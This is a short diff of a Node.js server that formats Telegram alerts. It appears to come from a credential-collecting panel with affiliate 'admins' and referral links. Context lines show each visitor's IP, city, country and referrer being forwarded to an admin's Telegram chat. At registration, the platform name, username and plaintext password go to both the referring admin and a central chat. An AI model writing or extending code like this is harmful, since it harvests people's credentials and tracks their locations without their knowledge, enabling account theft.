@@ -579,7 +579,7 @@ Hey *${escapeMarkdown(admin.firstname || admin.username)}* 📈 someone visited 
 Path: ${escapeMarkdown(path || "/")}
 Referral: ${escapeMarkdown(actualReferrer || "direct")}
 Location: ${escapeMarkdown(location.city || "Hidden")}, ${escapeMarkdown(location.country || "Hidden")}
-IP: *${escapeMarkdown(ip || "Hidden")}*,${escapeMarkdown(location)}
+IP: *${escapeMarkdown(ip || "Hidden")}*,${JSON.stringify(escapeMarkdown(location))}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, message).catch(()=>null);
 
@@ -659,12 +659,12 @@ Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
 password : *${escapeMarkdown(password)}*
 Referrer: *${escapeMarkdown(admin.username)}*
-Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}${location.flag.emoji || "Unknown"},
+Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}${location.flag|| "Unknown"},
 *${escapeMarkdown(location.state || "unknown")}*,\n ${escapeMarkdown(location)}
 `;
     sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
 
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from ${escapeMarkdown(location|| "Unknown")}`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}'s link) from ${JSON.stringify(escapeMarkdown(location|| "Unknown"))}`);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
